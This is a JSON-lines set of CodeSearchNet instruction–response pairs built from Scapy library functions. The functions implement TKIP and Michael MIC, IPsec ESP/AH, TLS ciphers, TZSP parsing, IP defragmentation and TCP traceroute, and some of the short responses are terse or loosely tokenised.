{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nimplementing TKIP WEPSeed generation", "response": "def gen_TKIP_RC4_key(TSC, TA, TK):\n    \"\"\"Implement TKIP WEPSeed generation\n    TSC: packet IV\n    TA: target addr bytes\n    TK: temporal key\n    \"\"\"\n\n    assert len(TSC) == 6\n    assert len(TA) == 6\n    assert len(TK) == 16\n    assert all(isinstance(x, six.integer_types) for x in TSC + TA + TK)\n\n    # Phase 1\n    # 802.11i p.54\n\n    # Phase 1 - Step 1\n    TTAK = []\n    TTAK.append(_MK16(TSC[3], TSC[2]))\n    TTAK.append(_MK16(TSC[5], TSC[4]))\n    TTAK.append(_MK16(TA[1], TA[0]))\n    TTAK.append(_MK16(TA[3], TA[2]))\n    TTAK.append(_MK16(TA[5], TA[4]))\n\n    # Phase 1 - Step 2\n    for i in range(PHASE1_LOOP_CNT):\n        j = 2 * (i & 1)\n        TTAK[0] = _CAST16(TTAK[0] + _SBOX16(TTAK[4] ^ _MK16(TK[1 + j], TK[0 + j])))  # noqa: E501\n        TTAK[1] = _CAST16(TTAK[1] + _SBOX16(TTAK[0] ^ _MK16(TK[5 + j], TK[4 + j])))  # noqa: E501\n        TTAK[2] = _CAST16(TTAK[2] + _SBOX16(TTAK[1] ^ _MK16(TK[9 + j], TK[8 + j])))  # noqa: E501\n        TTAK[3] = _CAST16(TTAK[3] + _SBOX16(TTAK[2] ^ _MK16(TK[13 + j], TK[12 + j])))  # noqa: E501\n        TTAK[4] = _CAST16(TTAK[4] + _SBOX16(TTAK[3] ^ _MK16(TK[1 + j], TK[0 + j])) + i)  # noqa: E501\n\n    # Phase 2\n    # 802.11i p.56\n\n    # Phase 2 - Step 1\n    PPK = list(TTAK)\n    PPK.append(_CAST16(TTAK[4] + _MK16(TSC[1], TSC[0])))\n\n    # Phase 2 - Step 2\n    PPK[0] = _CAST16(PPK[0] + _SBOX16(PPK[5] ^ _MK16(TK[1], TK[0])))\n    PPK[1] = _CAST16(PPK[1] + _SBOX16(PPK[0] ^ _MK16(TK[3], TK[2])))\n    PPK[2] = _CAST16(PPK[2] + _SBOX16(PPK[1] ^ _MK16(TK[5], TK[4])))\n    PPK[3] = _CAST16(PPK[3] + _SBOX16(PPK[2] ^ _MK16(TK[7], TK[6])))\n    PPK[4] = _CAST16(PPK[4] + _SBOX16(PPK[3] ^ _MK16(TK[9], TK[8])))\n    PPK[5] = _CAST16(PPK[5] + _SBOX16(PPK[4] ^ _MK16(TK[11], TK[10])))\n\n    PPK[0] = _CAST16(PPK[0] + _RotR1(PPK[5] ^ _MK16(TK[13], TK[12])))\n    PPK[1] = _CAST16(PPK[1] + _RotR1(PPK[0] ^ _MK16(TK[15], TK[14])))\n    PPK[2] = _CAST16(PPK[2] + _RotR1(PPK[1]))\n    PPK[3] = _CAST16(PPK[3] + _RotR1(PPK[2]))\n    PPK[4] = _CAST16(PPK[4] + _RotR1(PPK[3]))\n    PPK[5] = _CAST16(PPK[5] + _RotR1(PPK[4]))\n\n    # Phase 2 - Step 3\n    WEPSeed = []\n    WEPSeed.append(TSC[1])\n    WEPSeed.append((TSC[1] | 0x20) & 0x7f)\n    WEPSeed.append(TSC[0])\n    WEPSeed.append(((PPK[5] ^ _MK16(TK[1], TK[0])) >> 1) & 0xFF)\n    for i in range(6):\n        WEPSeed.append(PPK[i] & 0xFF)\n        WEPSeed.append(PPK[i] >> 8)\n\n    assert len(WEPSeed) == 16\n\n    return b\"\".join(chb(x) for x in WEPSeed)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _michael_b(m_l, m_r):\n    m_r = m_r ^ _rotate_left32(m_l, 17)\n    m_l = (m_l + m_r) % 2**32\n    m_r = m_r ^ _XSWAP(m_l)\n    m_l = (m_l + m_r) % 2**32\n    m_r = m_r ^ _rotate_left32(m_l, 3)\n    m_l = (m_l + m_r) % 2**32\n    m_r = m_r ^ _rotate_right32(m_l, 2)\n    m_l = (m_l + m_r) % 2**32\n    return m_l, m_r", "response": "Defined in 802. 11i p. 49"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef michael(key, to_hash):\n\n    # Block size: 4\n    nb_block, nb_extra_bytes = divmod(len(to_hash), 4)\n    # Add padding\n    data = to_hash + chb(0x5a) + b\"\\x00\" * (7 - nb_extra_bytes)\n\n    # Hash\n    m_l, m_r = unpack('<II', key)\n    for i in range(nb_block + 2):\n        # Convert i-th block to int\n        block_i = unpack('<I', data[i * 4:i * 4 + 4])[0]\n        m_l ^= block_i\n        m_l, m_r = _michael_b(m_l, m_r)\n    return pack('<II', m_l, m_r)", "response": "Defined in 802.11i p.48"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nextracts TSCs TA and encoded - data from a packet.", "response": "def parse_TKIP_hdr(pkt):\n    \"\"\"Extract TSCs, TA and encoded-data from a packet @pkt\"\"\"\n    # Note: FCS bit is not handled\n    assert pkt.FCfield.protected\n\n    # 802.11i - 8.3.2.2\n    tkip_layer = pkt[Dot11TKIP]\n    payload = tkip_layer.data\n\n    # IV\n    if not tkip_layer.ext_iv:\n        # 802.11i p. 46\n        raise ValueError(\"Extended IV must be set for TKIP\")\n    TSC0 = tkip_layer.TSC0\n    TSC1 = tkip_layer.TSC1\n    WEPseed = tkip_layer.WEPSeed\n\n    # Extended IV\n    TSC2 = tkip_layer.TSC2\n    TSC3 = tkip_layer.TSC3\n    TSC4 = tkip_layer.TSC4\n    TSC5 = tkip_layer.TSC5\n\n    # 802.11i p. 46\n    assert (TSC1 | 0x20) & 0x7f == WEPseed\n\n    TA = [orb(e) for e in mac2str(pkt.addr2)]\n    TSC = [TSC0, TSC1, TSC2, TSC3, TSC4, TSC5]\n\n    return TSC, TA, payload"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef build_TKIP_payload(data, iv, mac, tk):\n    TSC5, TSC4, TSC3, TSC2, TSC1, TSC0 = (\n        (iv >> 40) & 0xFF,\n        (iv >> 32) & 0xFF,\n        (iv >> 24) & 0xFF,\n        (iv >> 16) & 0xFF,\n        (iv >> 8) & 0xFF,\n        iv & 0xFF\n    )\n    bitfield = 1 << 5  # Extended IV\n    TKIP_hdr = chb(TSC1) + chb((TSC1 | 0x20) & 0x7f) + chb(TSC0) + chb(bitfield)  # noqa: E501\n    TKIP_hdr += chb(TSC2) + chb(TSC3) + chb(TSC4) + chb(TSC5)\n\n    TA = [orb(e) for e in mac2str(mac)]\n    TSC = [TSC0, TSC1, TSC2, TSC3, TSC4, TSC5]\n    TK = [orb(x) for x in tk]\n\n    rc4_key = gen_TKIP_RC4_key(TSC, TA, TK)\n    return TKIP_hdr + ARC4_encrypt(rc4_key, data)", "response": "Build a TKIP payload for IV and MAC and encrypt it based on temporal key tk."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_data_pkt(pkt, tk):\n    TSC, TA, data = parse_TKIP_hdr(pkt)\n    TK = [orb(x) for x in tk]\n\n    rc4_key = gen_TKIP_RC4_key(TSC, TA, TK)\n    return ARC4_decrypt(rc4_key, data)", "response": "Extract data from a WPA packet with temporal key tk"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking MIC and ICV & return the data from a decrypted TKIP packet", "response": "def check_MIC_ICV(data, mic_key, source, dest):\n    \"\"\"Check MIC, ICV & return the data from a decrypted TKIP packet\"\"\"\n    assert len(data) > 12\n\n    # DATA - MIC(DA - SA - Priority=0 - 0 - 0 - 0 - DATA) - ICV\n    # 802.11i p.47\n\n    ICV = data[-4:]\n    MIC = data[-12:-4]\n    data_clear = data[:-12]\n\n    expected_ICV = pack(\"<I\", crc32(data_clear + MIC) & 0xFFFFFFFF)\n    if expected_ICV != ICV:\n        raise ICVError()\n\n    sa = mac2str(source)  # Source MAC\n    da = mac2str(dest)  # Dest MAC\n\n    expected_MIC = michael(mic_key, da + sa + b\"\\x00\" * 4 + data_clear)\n    if expected_MIC != MIC:\n        raise MICError()\n\n    return data_clear"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes and return the data with its MIC and ICV", "response": "def build_MIC_ICV(data, mic_key, source, dest):\n    \"\"\"Compute and return the data with its MIC and ICV\"\"\"\n    # DATA - MIC(DA - SA - Priority=0 - 0 - 0 - 0 - DATA) - ICV\n    # 802.11i p.47\n\n    sa = mac2str(source)  # Source MAC\n    da = mac2str(dest)  # Dest MAC\n    MIC = michael(mic_key, da + sa + b\"\\x00\" + b\"\\x00\" * 3 + data)\n    ICV = pack(\"<I\", crc32(data + MIC) & 0xFFFFFFFF)\n\n    return data + MIC + ICV"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _lcm(a, b):\n    if a == 0 or b == 0:\n        return 0\n    else:\n        return abs(a * b) // gcd(a, b)", "response": "Return the Least Common Multiple between 2 integers."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef split_for_transport(orig_pkt, transport_proto):\n    # force resolution of default fields to avoid padding errors\n    header = orig_pkt.__class__(raw(orig_pkt))\n    next_hdr = header.payload\n    nh = None\n\n    if header.version == 4:\n        nh = header.proto\n        header.proto = transport_proto\n        header.remove_payload()\n        del header.chksum\n        del header.len\n\n        return header, nh, next_hdr\n    else:\n        found_rt_hdr = False\n        prev = header\n\n        # Since the RFC 4302 is vague about where the ESP/AH headers should be\n        # inserted in IPv6, I chose to follow the linux implementation.\n        while isinstance(next_hdr, (IPv6ExtHdrHopByHop, IPv6ExtHdrRouting, IPv6ExtHdrDestOpt)):  # noqa: E501\n            if isinstance(next_hdr, IPv6ExtHdrHopByHop):\n                pass\n            if isinstance(next_hdr, IPv6ExtHdrRouting):\n                found_rt_hdr = True\n            elif isinstance(next_hdr, IPv6ExtHdrDestOpt) and found_rt_hdr:\n                break\n\n            prev = next_hdr\n            next_hdr = next_hdr.payload\n\n        nh = prev.nh\n        prev.nh = transport_proto\n        prev.remove_payload()\n        del header.plen\n\n        return header, nh, next_hdr", "response": "Split an IP or IPv6 packet into two components."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a new Cipher object for the current object.", "response": "def new_cipher(self, key, mode_iv, digest=None):\n        \"\"\"\n        @param key:     the secret key, a byte string\n        @param mode_iv: the initialization vector or nonce, a byte string.\n                        Formatted by `format_mode_iv`.\n        @param digest:  also known as tag or icv. A byte string containing the\n                        digest of the encrypted data. Only use this during\n                        decryption!\n\n        @return:    an initialized cipher object for this algo\n        \"\"\"\n        if self.is_aead and digest is not None:\n            # With AEAD, the mode needs the digest during decryption.\n            return Cipher(\n                self.cipher(key),\n                self.mode(mode_iv, digest, len(digest)),\n                default_backend(),\n            )\n        else:\n            return Cipher(\n                self.cipher(key),\n                self.mode(mode_iv),\n                default_backend(),\n            )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef pad(self, esp):\n        # 2 extra bytes for padlen and nh\n        data_len = len(esp.data) + 2\n\n        # according to the RFC4303, section 2.4. Padding (for Encryption)\n        # the size of the ESP payload must be a multiple of 32 bits\n        align = _lcm(self.block_size, 4)\n\n        # pad for block size\n        esp.padlen = -data_len % align\n\n        # Still according to the RFC, the default value for padding *MUST* be an  # noqa: E501\n        # array of bytes starting from 1 to padlen\n        # TODO: Handle padding function according to the encryption algo\n        esp.padding = struct.pack(\"B\" * esp.padlen, *range(1, esp.padlen + 1))\n\n        # If the following test fails, it means that this algo does not comply\n        # with the RFC\n        payload_len = len(esp.iv) + len(esp.data) + len(esp.padding) + 2\n        if payload_len % 4 != 0:\n            raise ValueError('The size of the ESP data is not aligned to 32 bits after padding.')  # noqa: E501\n\n        return esp", "response": "Add the correct amount of padding so that the data to encrypt is\n        exactly a multiple of the algorithm s block size."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef encrypt(self, sa, esp, key):\n        data = esp.data_for_encryption()\n\n        if self.cipher:\n            mode_iv = self._format_mode_iv(algo=self, sa=sa, iv=esp.iv)\n            cipher = self.new_cipher(key, mode_iv)\n            encryptor = cipher.encryptor()\n\n            if self.is_aead:\n                aad = struct.pack('!LL', esp.spi, esp.seq)\n                encryptor.authenticate_additional_data(aad)\n                data = encryptor.update(data) + encryptor.finalize()\n                data += encryptor.tag[:self.icv_size]\n            else:\n                data = encryptor.update(data) + encryptor.finalize()\n\n        return ESP(spi=esp.spi, seq=esp.seq, data=esp.iv + data)", "response": "Encrypt an ESP packet with this algorithm"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef check_key(self, key):\n        if self.key_size and len(key) not in self.key_size:\n            raise TypeError('invalid key size %s, must be one of %s' %\n                            (len(key), self.key_size))", "response": "Check that the key length is valid."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef sign(self, pkt, key):\n        if not self.mac:\n            return pkt\n\n        mac = self.new_mac(key)\n\n        if pkt.haslayer(ESP):\n            mac.update(raw(pkt[ESP]))\n            pkt[ESP].data += mac.finalize()[:self.icv_size]\n\n        elif pkt.haslayer(AH):\n            clone = zero_mutable_fields(pkt.copy(), sending=True)\n            mac.update(raw(clone))\n            pkt[AH].icv = mac.finalize()[:self.icv_size]\n\n        return pkt", "response": "Sign an IPsec packet with this algo."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef verify(self, pkt, key):\n        if not self.mac or self.icv_size == 0:\n            return\n\n        mac = self.new_mac(key)\n\n        pkt_icv = 'not found'\n        computed_icv = 'not computed'\n\n        if isinstance(pkt, ESP):\n            pkt_icv = pkt.data[len(pkt.data) - self.icv_size:]\n            clone = pkt.copy()\n            clone.data = clone.data[:len(clone.data) - self.icv_size]\n\n        elif pkt.haslayer(AH):\n            if len(pkt[AH].icv) != self.icv_size:\n                # Fill padding since we know the actual icv_size\n                pkt[AH].padding = pkt[AH].icv[self.icv_size:]\n                pkt[AH].icv = pkt[AH].icv[:self.icv_size]\n            pkt_icv = pkt[AH].icv\n            clone = zero_mutable_fields(pkt.copy(), sending=False)\n\n        mac.update(raw(clone))\n        computed_icv = mac.finalize()[:self.icv_size]\n\n        # XXX: Cannot use mac.verify because the ICV can be truncated\n        if pkt_icv != computed_icv:\n            raise IPSecIntegrityError('pkt_icv=%r, computed_icv=%r' %\n                                      (pkt_icv, computed_icv))", "response": "Verify that the ICV of a packet is valid."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef encrypt(self, pkt, seq_num=None, iv=None):\n        if not isinstance(pkt, self.SUPPORTED_PROTOS):\n            raise TypeError('cannot encrypt %s, supported protos are %s'\n                            % (pkt.__class__, self.SUPPORTED_PROTOS))\n        if self.proto is ESP:\n            return self._encrypt_esp(pkt, seq_num=seq_num, iv=iv)\n        else:\n            return self._encrypt_ah(pkt, seq_num=seq_num)", "response": "Encrypt an IP ( v6 packet with ESP or AH according to this SecurityAssociation."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef decrypt(self, pkt, verify=True):\n        if not isinstance(pkt, self.SUPPORTED_PROTOS):\n            raise TypeError('cannot decrypt %s, supported protos are %s'\n                            % (pkt.__class__, self.SUPPORTED_PROTOS))\n\n        if self.proto is ESP and pkt.haslayer(ESP):\n            return self._decrypt_esp(pkt, verify=verify)\n        elif self.proto is AH and pkt.haslayer(AH):\n            return self._decrypt_ah(pkt, verify=verify)\n        else:\n            raise TypeError('%s has no %s layer' % (pkt, self.proto.name))", "response": "Decrypt an IP ( v6 packet and return the decrypted packet."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the explicit nonce.", "response": "def _update_nonce_explicit(self):\n        \"\"\"\n        Increment the explicit nonce while avoiding any overflow.\n        \"\"\"\n        ne = self.nonce_explicit + 1\n        self.nonce_explicit = ne % 2**(self.nonce_explicit_len * 8)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nencrypt the data then prepend the explicit part of the nonce.", "response": "def auth_encrypt(self, P, A, seq_num=None):\n        \"\"\"\n        Encrypt the data then prepend the explicit part of the nonce. The\n        authentication tag is directly appended with the most recent crypto\n        API. Additional data may be authenticated without encryption (as A).\n\n        The 'seq_num' should never be used here, it is only a safeguard needed\n        because one cipher (ChaCha20Poly1305) using TLS 1.2 logic in record.py\n        actually is a _AEADCipher_TLS13 (even though others are not).\n        \"\"\"\n        if False in six.itervalues(self.ready):\n            raise CipherError(P, A)\n\n        if hasattr(self, \"pc_cls\"):\n            self._cipher.mode._initialization_vector = self._get_nonce()\n            self._cipher.mode._tag = None\n            encryptor = self._cipher.encryptor()\n            encryptor.authenticate_additional_data(A)\n            res = encryptor.update(P) + encryptor.finalize()\n            res += encryptor.tag\n        else:\n            res = self._cipher.encrypt(self._get_nonce(), P, A)\n\n        nonce_explicit = pkcs_i2osp(self.nonce_explicit,\n                                    self.nonce_explicit_len)\n        self._update_nonce_explicit()\n        return nonce_explicit + res"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nencrypts the data and append the computed authentication code.", "response": "def auth_encrypt(self, P, A, seq_num):\n        \"\"\"\n        Encrypt the data, and append the computed authentication code.\n        TLS 1.3 does not use additional data, but we leave this option to the\n        user nonetheless.\n\n        Note that the cipher's authentication tag must be None when encrypting.\n        \"\"\"\n        if False in six.itervalues(self.ready):\n            raise CipherError(P, A)\n\n        if hasattr(self, \"pc_cls\"):\n            self._cipher.mode._tag = None\n            self._cipher.mode._initialization_vector = self._get_nonce(seq_num)\n            encryptor = self._cipher.encryptor()\n            encryptor.authenticate_additional_data(A)\n            res = encryptor.update(P) + encryptor.finalize()\n            res += encryptor.tag\n        else:\n            if (conf.crypto_valid_advanced and\n                    isinstance(self._cipher, AESCCM)):\n                res = self._cipher.encrypt(self._get_nonce(seq_num), P, A,\n                                           tag_length=self.tag_len)\n            else:\n                res = self._cipher.encrypt(self._get_nonce(seq_num), P, A)\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _tzsp_guess_next_tag(payload):\n\n    if not payload:\n        warning('missing payload')\n        return None\n\n    tag_type = orb(payload[0])\n\n    try:\n        tag_class_definition = _TZSP_TAG_CLASSES[tag_type]\n\n    except KeyError:\n\n        return _tzsp_handle_unknown_tag(payload, tag_type)\n\n    if type(tag_class_definition) is not dict:\n        return tag_class_definition\n\n    try:\n        length = orb(payload[1])\n    except IndexError:\n        length = None\n\n    if not length:\n        warning('no tag length given - packet to short')\n        return Raw\n\n    try:\n        return tag_class_definition[length]\n    except KeyError:\n        warning('invalid tag length {} for tag type {}'.format(length, tag_type))  # noqa: E501\n        return Raw", "response": "Helper function to guess the next tag from a list of payload."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the class that holds the encapsulated payload of the TZSP packet", "response": "def get_encapsulated_payload_class(self):\n        \"\"\"\n        get the class that holds the encapsulated payload of the TZSP packet\n        :return: class representing the payload, Raw() on error\n        \"\"\"\n\n        try:\n            return TZSP.ENCAPSULATED_PROTOCOL_CLASSES[self.encapsulated_protocol]  # noqa: E501\n        except KeyError:\n            warning(\n                'unknown or invalid encapsulation type (%i) - returning payload as raw()' % self.encapsulated_protocol)  # noqa: E501\n            return Raw"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nguessing the type of the payload encapsulation is given be the outer TZSP layers attribute encapsulation_protocol", "response": "def guess_payload_class(self, payload):\n        \"\"\"\n        the type of the payload encapsulation is given be the outer TZSP layers attribute encapsulation_protocol  # noqa: E501\n        \"\"\"\n\n        under_layer = self.underlayer\n        tzsp_header = None\n\n        while under_layer:\n            if isinstance(under_layer, TZSP):\n                tzsp_header = under_layer\n                break\n            under_layer = under_layer.underlayer\n\n        if tzsp_header:\n\n            return tzsp_header.get_encapsulated_payload_class()\n        else:\n            raise TZSPStructureException('missing parent TZSP header')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef h2i(self, pkt, x):\n\n        if isinstance(x, str) and x.startswith(\"v\") and len(x) <= 8:\n            major = int(x.split(\".\")[0][1:])\n            minor = int(x.split(\".\")[1])\n\n            return (major << 8) | minor\n\n        elif isinstance(x, int) and 0 <= x <= 65535:\n            return x\n        else:\n            if not hasattr(self, \"default\"):\n                return x\n            if self.default is not None:\n                warning(\"set value to default. Format of %r is invalid\" % x)\n                return self.default\n            else:\n                raise Scapy_Exception(\"Format of value is invalid\")", "response": "The field accepts string values like v12. 1. 255."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_algs_from_ciphersuite_name(ciphersuite_name):\n    tls1_3 = False\n    if ciphersuite_name.startswith(\"TLS\"):\n        s = ciphersuite_name[4:]\n\n        if s.endswith(\"CCM\") or s.endswith(\"CCM_8\"):\n            kx_name, s = s.split(\"_WITH_\")\n            kx_alg = _tls_kx_algs.get(kx_name)\n            hash_alg = _tls_hash_algs.get(\"SHA256\")\n            cipher_alg = _tls_cipher_algs.get(s)\n            hmac_alg = None\n\n        else:\n            if \"WITH\" in s:\n                kx_name, s = s.split(\"_WITH_\")\n                kx_alg = _tls_kx_algs.get(kx_name)\n            else:\n                tls1_3 = True\n                kx_alg = _tls_kx_algs.get(\"TLS13\")\n\n            hash_name = s.split('_')[-1]\n            hash_alg = _tls_hash_algs.get(hash_name)\n\n            cipher_name = s[:-(len(hash_name) + 1)]\n            if tls1_3:\n                cipher_name += \"_TLS13\"\n            cipher_alg = _tls_cipher_algs.get(cipher_name)\n\n            hmac_alg = None\n            if cipher_alg is not None and cipher_alg.type != \"aead\":\n                hmac_name = \"HMAC-%s\" % hash_name\n                hmac_alg = _tls_hmac_algs.get(hmac_name)\n\n    elif ciphersuite_name.startswith(\"SSL\"):\n        s = ciphersuite_name[7:]\n        kx_alg = _tls_kx_algs.get(\"SSLv2\")\n        cipher_name, hash_name = s.split(\"_WITH_\")\n        cipher_alg = _tls_cipher_algs.get(cipher_name.rstrip(\"_EXPORT40\"))\n        kx_alg.export = cipher_name.endswith(\"_EXPORT40\")\n        hmac_alg = _tls_hmac_algs.get(\"HMAC-NULL\")\n        hash_alg = _tls_hash_algs.get(hash_name)\n\n    return kx_alg, cipher_alg, hmac_alg, hash_alg, tls1_3", "response": "Returns the 3 - tuple made of the Key Exchange Algorithm class the CipherExchange Algorithm class and the HMAC class."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_usable_ciphersuites(l, kx):\n    res = []\n    for c in l:\n        if c in _tls_cipher_suites_cls:\n            ciph = _tls_cipher_suites_cls[c]\n            if ciph.usable:\n                # XXX select among RSA and ECDSA cipher suites\n                # according to the key(s) the server was given\n                if ciph.kx_alg.anonymous or kx in ciph.kx_alg.name:\n                    res.append(c)\n    return res", "response": "This function returns a list of usable cipher suites i. e. for which key exchange cipher and hash cipher algorithms are known to be implemented and usable in current version of the TLS extension."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncompute the checksum of an IPv4 upper layer.", "response": "def in4_chksum(proto, u, p):\n    \"\"\"\n    As Specified in RFC 2460 - 8.1 Upper-Layer Checksums\n\n    Performs IPv4 Upper Layer checksum computation. Provided parameters are:\n    - 'proto' : value of upper layer protocol\n    - 'u'  : IP upper layer instance\n    - 'p'  : the payload of the upper layer provided as a string\n    \"\"\"\n    if not isinstance(u, IP):\n        warning(\"No IP underlayer to compute checksum. Leaving null.\")\n        return 0\n    if u.len is not None:\n        if u.ihl is None:\n            olen = sum(len(x) for x in u.options)\n            ihl = 5 + olen // 4 + (1 if olen % 4 else 0)\n        else:\n            ihl = u.ihl\n        ln = max(u.len - 4 * ihl, 0)\n    else:\n        ln = len(p)\n    psdhdr = struct.pack(\"!4s4sHH\",\n                         inet_pton(socket.AF_INET, u.src),\n                         inet_pton(socket.AF_INET, u.dst),\n                         proto,\n                         ln)\n    return checksum(psdhdr + p)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _defrag_list(lst, defrag, missfrag):\n    p = lst[0]\n    lastp = lst[-1]\n    if p.frag > 0 or lastp.flags.MF:  # first or last fragment missing\n        missfrag.append(lst)\n        return\n    p = p.copy()\n    if conf.padding_layer in p:\n        del(p[conf.padding_layer].underlayer.payload)\n    ip = p[IP]\n    if ip.len is None or ip.ihl is None:\n        clen = len(ip.payload)\n    else:\n        clen = ip.len - (ip.ihl << 2)\n    txt = conf.raw_layer()\n    for q in lst[1:]:\n        if clen != q.frag << 3:  # Wrong fragmentation offset\n            if clen > q.frag << 3:\n                warning(\"Fragment overlap (%i > %i) %r || %r ||  %r\" % (clen, q.frag << 3, p, txt, q))  # noqa: E501\n            missfrag.append(lst)\n            break\n        if q[IP].len is None or q[IP].ihl is None:\n            clen += len(q[IP].payload)\n        else:\n            clen += q[IP].len - (q[IP].ihl << 2)\n        if conf.padding_layer in q:\n            del(q[conf.padding_layer].underlayer.payload)\n        txt.add_payload(q[IP].payload.copy())\n        if q.time > p.time:\n            p.time = q.time\n    else:\n        ip.flags.MF = False\n        del(ip.chksum)\n        del(ip.len)\n        p = p / txt\n        p._defrag_pos = max(x._defrag_pos for x in lst)\n        defrag.append(p)", "response": "Internal usage only. Part of the _defrag_logic"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _defrag_logic(plist, complete=False):\n    frags = defaultdict(lambda: [])\n    final = []\n    pos = 0\n    for p in plist:\n        p._defrag_pos = pos\n        pos += 1\n        if IP in p:\n            ip = p[IP]\n            if ip.frag != 0 or ip.flags.MF:\n                uniq = (ip.id, ip.src, ip.dst, ip.proto)\n                frags[uniq].append(p)\n                continue\n        final.append(p)\n\n    defrag = []\n    missfrag = []\n    for lst in six.itervalues(frags):\n        lst.sort(key=lambda x: x.frag)\n        _defrag_list(lst, defrag, missfrag)\n    defrag2 = []\n    for p in defrag:\n        q = p.__class__(raw(p))\n        q._defrag_pos = p._defrag_pos\n        q.time = p.time\n        defrag2.append(q)\n    if complete:\n        final.extend(defrag2)\n        final.extend(missfrag)\n        final.sort(key=lambda x: x._defrag_pos)\n        if hasattr(plist, \"listname\"):\n            name = \"Defragmented %s\" % plist.listname\n        else:\n            name = \"Defragmented\"\n        return PacketList(final, name=name)\n    else:\n        return PacketList(final), PacketList(defrag2), PacketList(missfrag)", "response": "Internal function used to defragment a list of packets."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _packetlist_timeskew_graph(self, ip, **kargs):\n\n    # Filter TCP segments which source address is 'ip'\n    tmp = (self._elt2pkt(x) for x in self.res)\n    b = (x for x in tmp if IP in x and x[IP].src == ip and TCP in x)\n\n    # Build a list of tuples (creation_time, replied_timestamp)\n    c = []\n    tsf = ICMPTimeStampField(\"\", None)\n    for p in b:\n        opts = p.getlayer(TCP).options\n        for o in opts:\n            if o[0] == \"Timestamp\":\n                c.append((p.time, tsf.any2i(\"\", o[1][0])))\n\n    # Stop if the list is empty\n    if not c:\n        warning(\"No timestamps found in packet list\")\n        return []\n\n    # Prepare the data that will be plotted\n    first_creation_time = c[0][0]\n    first_replied_timestamp = c[0][1]\n\n    def _wrap_data(ts_tuple, wrap_seconds=2000):\n        \"\"\"Wrap the list of tuples.\"\"\"\n\n        ct, rt = ts_tuple  # (creation_time, replied_timestamp)\n        X = ct % wrap_seconds\n        Y = ((ct - first_creation_time) - ((rt - first_replied_timestamp) / 1000.0))  # noqa: E501\n\n        return X, Y\n\n    data = [_wrap_data(e) for e in c]\n\n    # Mimic the default gnuplot output\n    if kargs == {}:\n        kargs = MATPLOTLIB_DEFAULT_PLOT_KARGS\n    lines = plt.plot(data, **kargs)\n\n    # Call show() if matplotlib is not inlined\n    if not MATPLOTLIB_INLINED:\n        plt.show()\n\n    return lines", "response": "Tries to plot the timeskew between the timestamps and real time for a given ip"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef traceroute(target, dport=80, minttl=1, maxttl=30, sport=RandShort(), l4=None, filter=None, timeout=2, verbose=None, **kargs):  # noqa: E501\n    if verbose is None:\n        verbose = conf.verb\n    if filter is None:\n        # we only consider ICMP error packets and TCP packets with at\n        # least the ACK flag set *and* either the SYN or the RST flag\n        # set\n        filter = \"(icmp and (icmp[0]=3 or icmp[0]=4 or icmp[0]=5 or icmp[0]=11 or icmp[0]=12)) or (tcp and (tcp[13] & 0x16 > 0x10))\"  # noqa: E501\n    if l4 is None:\n        a, b = sr(IP(dst=target, id=RandShort(), ttl=(minttl, maxttl)) / TCP(seq=RandInt(), sport=sport, dport=dport),  # noqa: E501\n                  timeout=timeout, filter=filter, verbose=verbose, **kargs)\n    else:\n        # this should always work\n        filter = \"ip\"\n        a, b = sr(IP(dst=target, id=RandShort(), ttl=(minttl, maxttl)) / l4,\n                  timeout=timeout, filter=filter, verbose=verbose, **kargs)\n\n    a = TracerouteResult(a.res)\n    if verbose:\n        a.show()\n    return a, b", "response": "Instant TCP traceroute\ntraceroute(target, [maxttl=30,] [dport=80,] [sport=80,] [verbose=conf.verb]) -> None  # noqa: E501"}
